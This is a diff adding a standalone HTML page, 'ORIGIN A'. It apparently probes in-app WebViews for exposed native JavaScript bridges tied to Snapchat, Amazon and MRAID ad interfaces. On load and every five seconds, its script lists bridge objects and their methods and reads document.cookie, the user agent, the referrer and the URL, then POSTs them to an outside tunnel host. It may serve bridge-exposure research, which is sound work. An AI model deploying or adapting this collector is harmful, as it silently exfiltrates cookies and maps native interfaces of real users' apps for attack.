@@ -1,0 +1,66 @@
+<!doctype html><html><head><meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<title>ORIGIN A</title></head><body style="font:13px monospace;padding:8px">
+<h2>ORIGIN A</h2>
+<p><a id=golink href="https://trailer-servers-ebony-sandy.trycloudflare.com/b">GO TO ORIGIN B</a></p>
+<pre id=out style="white-space:pre-wrap;word-break:break-all"></pre>
+<script>var LOGURL='https://wolf-does-lisa-landscapes.trycloudflare.com/log';
+
+var NAMES = ["JSBridge","WebJSBridge","SnapAdPerfMarker","SCGhostWriterAndroidBridge",
+ "SCGhostWriterBridge","AmazonShopExternalInterfaceHandler","ChatHtmlFullscreenAutoPlay",
+ "AutofillJsBridge","AndroidBridge","StorageBridge","RenderBridge","ScPlayableAd",
+ "MRAID_NATIVE","SCDynimacBridge","snapWebLensBridge","mobileCheckoutSdk",
+ "get_html_body_height_handler","__snapAdPerfMarkerInjected","mraid"];
+function enumBridge(){
+  var out={};
+  for (var i=0;i<NAMES.length;i++){
+    var n=NAMES[i]; var v;
+    try { v = window[n]; } catch(e){ out[n]="THREW:"+e; continue; }
+    if (v===undefined){ out[n]=null; continue; }
+    var meths=[];
+    try { for (var k in v) meths.push(k+":"+(typeof v[k])); } catch(e){ meths.push("ENUMFAIL"); }
+    out[n]={type:typeof v, keys:meths};
+  }
+  return out;
+}
+function extraGlobals(){
+  var std={};
+  ["window","self","document","name","location","customElements","history","navigation","locationbar",
+   "menubar","personalbar","scrollbars","statusbar","toolbar","status","closed","frames","length","top",
+   "opener","parent","frameElement","navigator","origin","external","screen","innerWidth","innerHeight",
+   "scrollX","pageXOffset","scrollY","pageYOffset","visualViewport","screenX","screenY","outerWidth",
+   "outerHeight","devicePixelRatio","clientInformation","screenLeft","screenTop","defaultStatus",
+   "defaultstatus","styleMedia","onsearch","isSecureContext","trustedTypes","performance","onappinstalled",
+   "onbeforeinstallprompt","crypto","indexedDB","sessionStorage","localStorage","onbeforexrselect",
+   "onabort","onblur"].forEach(function(k){std[k]=1;});
+  var out=[];
+  try { for (var k in window){ if(!(k in std) && !/^on[a-z]/.test(k)) out.push(k); } } catch(e){}
+  return out;
+}
+function report(tag){
+  var payload = {
+    tag: tag,
+    href: location.href,
+    origin: location.origin,
+    ua: navigator.userAgent,
+    cookie: document.cookie,
+    referrer: document.referrer,
+    hasOpener: !!window.opener,
+    isTop: window===window.top,
+    bridges: enumBridge(),
+    globals: extraGlobals(),
+    ts: new Date().toISOString()
+  };
+  try {
+    var x=new XMLHttpRequest();
+    x.open("POST", LOGURL, true);
+    x.setRequestHeader("Content-Type","text/plain");
+    x.send(JSON.stringify(payload));
+  } catch(e){}
+  var pre=document.getElementById("out");
+  if(pre) pre.textContent = JSON.stringify(payload,null,1);
+}
+
+report('A');
+setInterval(function(){report('A-tick')}, 5000);
+</script></body></html>
